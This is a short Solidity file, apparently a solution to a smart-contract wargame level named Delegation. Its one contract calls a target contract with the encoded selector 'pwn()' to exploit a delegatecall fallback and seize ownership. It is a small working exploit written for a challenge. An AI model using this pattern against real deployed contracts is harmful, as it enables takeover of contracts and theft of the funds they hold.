// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        bytes memory data = abi.encodeWithSignature("pwn()");
        payable(contractAddress).call{value: 0}(data);
    }
}
